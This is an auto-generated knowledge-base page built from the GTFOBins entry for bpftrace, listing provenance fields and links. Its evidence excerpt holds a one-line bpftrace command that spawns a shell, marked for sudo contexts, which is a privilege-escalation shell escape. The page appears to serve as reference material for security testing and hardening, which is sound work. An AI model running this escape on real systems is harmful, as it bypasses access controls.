---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# bpftrace

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `bpftrace` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bpftrace` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for bpftrace covering shell.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/bpftrace.md)
- Source verification: [source record](../../sources/gtfobins/bpftrace.md)

## Aliases

- `bpftrace`

## Source Verification

[source record](../../sources/gtfobins/bpftrace.md)

## Evidence Excerpt

```text
_body: ''
_name: bpftrace
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bpftrace
functions:
shell:
- code: bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
contexts:
sudo: null
```
